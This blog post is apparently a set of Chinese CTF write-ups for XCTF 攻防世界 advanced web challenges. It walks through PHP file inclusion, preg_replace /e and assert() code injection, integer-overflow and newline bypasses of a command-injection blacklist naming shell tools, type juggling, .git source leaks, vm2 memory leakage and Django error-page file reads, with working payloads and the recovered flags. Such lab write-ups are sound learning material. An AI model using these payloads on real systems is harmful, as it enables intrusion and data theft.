---
title: 攻防世界web高手进阶区(二)
date: 2022-07-07 17:39:54
tags: 
      - Web
categories:
      - [Web]
      - [CTF]
---

![image-20220707180845375](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071808494.png?x-oss-process=hzy)

<!--more-->

# ics-05

> 其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统

- 文件包含
- XFF

![image-20220626130518839](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730509.png?x-oss-process=hzy)

点云平台设备维护中心，可以看到payload发生变化

![image-20220626130627380](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730498.png?x-oss-process=hzy)

利用php伪协议查看源码，转义得到源码

```
?page=php://filter/read=convert.base64-encode/resource=index.php
```

```
<?php
error_reporting(0);

@session_start();
posix_setuid(1000);


?>
<!DOCTYPE HTML>
<html>

<head>
    <meta charset="utf-8">
    <meta name="renderer" content="webkit">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" href="layui/css/layui.css" media="all">
    <title>设备维护中心</title>
    <meta charset="utf-8">
</head>

<body>
    <ul class="layui-nav">
        <li class="layui-nav-item layui-this"><a href="?page=index">云平台设备维护中心</a></li>
    </ul>
    <fieldset class="layui-elem-field layui-field-title" style="margin-top: 30px;">
        <legend>设备列表</legend>
    </fieldset>
    <table class="layui-hide" id="test"></table>
    <script type="text/html" id="switchTpl">
        <!-- 这里的 checked 的状态只是演示 -->
        <input type="checkbox" name="sex" value="{{d.id}}" lay-skin="switch" lay-text="开|关" lay-filter="checkDemo" {{ d.id==1 0003 ? 'checked' : '' }}>
    </script>
    <script src="layui/layui.js" charset="utf-8"></script>
    <script>
    layui.use('table', function() {
        var table = layui.table,
            form = layui.form;

        table.render({
            elem: '#test',
            url: '/somrthing.json',
            cellMinWidth: 80,
            cols: [
                [
                    { type: 'numbers' },
                     { type: 'checkbox' },
                     { field: 'id', title: 'ID', width: 100, unresize: true, sort: true },
                     { field: 'name', title: '设备名', templet: '#nameTpl' },
                     { field: 'area', title: '区域' },
                     { field: 'status', title: '维护状态', minWidth: 120, sort: true },
                     { field: 'check', title: '设备开关', width: 85, templet: '#switchTpl', unresize: true }
                ]
            ],
            page: true
        });
    });
    </script>
    <script>
    layui.use('element', function() {
        var element = layui.element; //导航的hover效果、二级菜单等功能，需要依赖element模块
        //监听导航点击
        element.on('nav(demo)', function(elem) {
            //console.log(elem)
            layer.msg(elem.text());
        });
    });
    </script>

<?php

$page = $_GET[page];

if (isset($page)) {



if (ctype_alnum($page)) {
?>

    <br /><br /><br /><br />
    <div style="text-align:center">
        <p class="lead"><?php echo $page; die();?></p>
    <br /><br /><br /><br />

<?php

}else{

?>
        <br /><br /><br /><br />
        <div style="text-align:center">
            <p class="lead">
                <?php

                if (strpos($page, 'input') > 0) {
                    die();
                }

                if (strpos($page, 'ta:text') > 0) {
                    die();
                }

                if (strpos($page, 'text') > 0) {
                    die();
                }

                if ($page === 'index.php') {
                    die('Ok');
                }
                    include($page);
                    die();
                ?>
        </p>
        <br /><br /><br /><br />

<?php
}}


//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试

if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {

    echo "<br >Welcome My Admin ! <br >";

    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[sub];

    if (isset($pattern) && isset($replacement) && isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
    }else{
        die();
    }

}





?>

</body>

</html>
```

加XFF，构造payload

```
GET /index.php?pat=/123/e&rep=system("find+-iname+flag")&sub=123456 HTTP/1.1
Host: 111.200.241.244:54061
Cache-Control: max-age=0
X-Forwarded-For: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=g69j1stg83bo1v3hh4h0q25v93
Connection: close
```

![image-20220626131658945](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730493.png?x-oss-process=hzy)

```
GET /index.php?pat=/123/e&rep=system("cat+./s3chahahaDir/flag/flag.php")&sub=123456 HTTP/1.1
Host: 111.200.241.244:54061
Cache-Control: max-age=0
X-Forwarded-For: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=g69j1stg83bo1v3hh4h0q25v93
Connection: close
```

![image-20220626131907894](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730427.png?x-oss-process=hzy)

# favorite_number

- 整型溢出

```
<?php
//php5.5.9
$stuff = $_POST["stuff"];
$array = ['admin', 'user'];
if($stuff === $array && $stuff[0] != 'admin') {  // stuff和array强等于且字符串首字母不同
    $num= $_POST["num"];
    if (preg_match("/^\d+$/im",$num)){     // num字符串全部由数字组成，大小写不敏感，跨行检测
        if (!preg_match("/sh|wget|nc|python|php|perl|\?|flag|}|cat|echo|\*|\^|\]|\\\\|'|\"|\|/i",$num)){  
         //黑名单
            echo "my favorite num is:";
            system("echo ".$num);
        }else{
            echo 'Bonjour!';
        }
    }
} else {
    highlight_file(__FILE__);
}
```

利用PHP的数组下标的一个BUG，可以利用`整型溢出`

payload

```
stuff[4294967296]=admin&stuff[1]=user&num=123456
```

![image-20220626132356734](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730579.png?x-oss-process=hzy)

> %0a是换行符可以进行绕过

![image-20220626132535363](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730649.png?x-oss-process=hzy)

![image-20220626132659282](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730831.png?x-oss-process=hzy)

但是这样直接读取读不出来，用inode索引节点，先寻找flag的inode

![image-20220626132809315](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730680.png?x-oss-process=hzy)

![image-20220626133015558](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730930.png?x-oss-process=hzy)



# lottery

- git源码泄露
- robots

![image-20220626133246971](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730750.png?x-oss-process=hzy)

![image-20220626133235488](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730686.png?x-oss-process=hzy)

使用 GitHack 扫描 url，成功把泄露的文件都下载下来，发现api.php

```
GitHack.py http://220.249.52.133:58698/.git/
```

```
function buy($req){
	require_registered();
	require_min_money(2);

	$money = $_SESSION['money'];
	$numbers = $req['numbers'];
	$win_numbers = random_win_nums();
	$same_count = 0;
	for($i = 0; $i < 7; $i++){
		if($numbers[$i] == $win_numbers[$i]){
			$same_count++;
		}
	}
	switch ($same_count) {
		case 2:
			$prize = 5;
			break;
		case 3:
			$prize = 20;
			break;
		case 4:
			$prize = 300;
			break;
		case 5:
			$prize = 1800;
			break;
		case 6:
			$prize = 200000;
			break;
		case 7:
			$prize = 5000000;
			break;
		default:
			$prize = 0;
			break;
	}
	$money += $prize - 2;
	$_SESSION['money'] = $money;
	response(['status'=>'ok','numbers'=>$numbers, 'win_numbers'=>$win_numbers, 'money'=>$money, 'prize'=>$prize]);
}
```

改包，修改 numbers 变量为一个数组，其中的 7 个变量都是 true

```
{"action":"buy","numbers":[true,true,true,true,true,true,true]}
```

![image-20220707162511752](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730784.png?x-oss-process=hzy)

> 这里要注意类型一定要加上去，要不然会报错

然后赚钱购买flag就行了

![image-20220707162558032](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730555.png?x-oss-process=hzy)

# mfw

![image-20220707170737233](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730673.png?x-oss-process=hzy)

有三个页面，但是看源码能看到一个flag页被注释掉了![image-20220707170831125](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730681.png?x-oss-process=hzy)

访问一下发现是白页，应该是被拒绝访问

![image-20220707170856516](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730885.png?x-oss-process=hzy)

直接目录遍历发现不行

![image-20220707171044535](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730243.png?x-oss-process=hzy)

通过这个又知道网站基本情况

![image-20220707171117103](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730408.png?x-oss-process=hzy)

> 该网站是用git托管源码,以及用PHP编写，有一个flag文件

那就可能是git源码泄露，访问/.git

![image-20220707171251928](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730839.png?x-oss-process=hzy)

确认是git源码泄露之后使用githack把源码down下来

```
 python3 githacker.py --url http://111.200.241.244:52612/ --folder result
```

然后会在template/flag.php发现关键代码

```
<?php

if (isset($_GET['page'])) {
	$page = $_GET['page'];
} else {
	$page = "home";
}

$file = "templates/" . $page . ".php";//用于拼接形成目录路径

// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!"); // 这个就是刚才不能使用目录比案例的原因

// TODO: Make this look nice
assert("file_exists('$file')") or die("That file doesn't exist!");
?>
```

assert函数，所以考虑是任意代码执行，assert函数对传入的参数可能会当作php代码进行执行

这个时候我们就可以把page后的参数进行闭合，传入可执行命令，并且注释掉后续的代码，这就实现了让assert函数执行任意命令

```
?page=');//'
```

说明闭合成功

![image-20220707172028414](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730749.png?x-oss-process=hzy)

继续进行命令注入

```
？page=').system("ls"); //
?page=%27).system("cat%20/var/www/html/templates/flag.php");//
```

![image-20220707172440816](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730787.png?x-oss-process=hzy)

# leaking

- nodejs沙箱逃逸

这个方面的漏洞还没系统的学，这题边做边学吧

首先看源代码

```

"use strict";

var randomstring = require("randomstring");
var express = require("express");
var {
    VM
} = require("vm2");
var fs = require("fs");

var app = express();
var flag = require("./config.js").flag

app.get("/", function(req, res) {
    res.header("Content-Type", "text/plain");

    /*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */
    eval("var flag_" + randomstring.generate(64) + " = \"flag{" + flag + "}\";")
    if (req.query.data && req.query.data.length <= 12) {
        var vm = new VM({
            timeout: 1000
        });
        console.log(req.query.data);
        res.send("eval ->" + vm.run(req.query.data));
    } else {
        res.send(fs.readFileSync(__filename).toString());
    }
});

app.listen(3000, function() {
    console.log("listening on port 3000!");
});
```

由于第一个eval把flag读入了在内存中的全局变量
所以只要我们能通过沙箱里的eval去读取内存中的内容的话，就可以形成沙箱逃逸

直接用Buffer()函数用于读取内存的内容，可以通过这个函数直接去读取全局内存中的内容
由于内存的保护机制，并不是每一次都能读取到含有flag内容的代码，所以多执行几次脚本

```
# encoding=utf-8
import requests
import time
import re
url = 'http://111.200.241.244:51125/?data=Buffer(500)'
response = ''
while 'flag' not in response:
        req = requests.get(url)
        response = req.text
        print(req.status_code)
        time.sleep(0.1)
        if 'flag{' in response:
            print(re.findall(r'flag{.+}',response))
            break
```

![image-20220707175723487](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071757578.png?x-oss-process=hzy)

# Cat

> 抓住那只猫

![image-20220707175819174](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071758243.png?x-oss-process=hzy)

输入一个ip，看看什么功能

![image-20220707175845837](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071758901.png?x-oss-process=hzy)

发现会ping这个ip，那么利用分隔符漏洞就行，但是实践告诉我们，这样不行

![image-20220707180027178](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071800249.png?x-oss-process=hzy)

网站用的是php写的，但是这个Cloud端就不一定是php的了。

传参处?url=这里，我们传递个%79发现传递之后变成了?url=w，看来是可以传递url编码，系统会接受并进行解析，于是我们传递%80会出现报错，url编码使用的是16进制，80也就是128，ASCII码是从0-127，所以这个时候会报错。url编码表可以参考http://www.w3school.com.cn/tags/html_ref_urlencode.html


![image-20220707180317132](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071803213.png?x-oss-process=hzy)

```
<title>UnicodeEncodeError at /api/ping</title>

使用的是python站点
使用的是Django框架
```

![image-20220707180432831](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071804964.png?x-oss-process=hzy)

所以根据Django的目录，我们使用@进行文件传递，对文件进行读取之后还会把内容传给url参数，如果像上面一样有超出解析范围的编码的时候就会得到错误信息。

我们的目标首先是数据库文件，看从错误信息中能不能拿到flag，可以从配置文件settings.py的报错中看看有没有database的相关信息

```
?url=@/opt/api/api/settings.py
```

报错内容搜索database可以得到：

![image-20220707180632276](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071806360.png?x-oss-process=hzy)

```
?url=@/opt/api/database.sqlite3
```

![image-20220707180741591](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071807646.png?x-oss-process=hzy)

报错信息中搜索ctf，拿到WHCTF{yoooo_Such_A_G00D_@}

参考文章：

[攻防世界-web-Cat(XCTF 4th-WHCTF-2017)_大千SS的博客-CSDN博客_攻防世界网址](https://blog.csdn.net/zz_Caleb/article/details/95041031)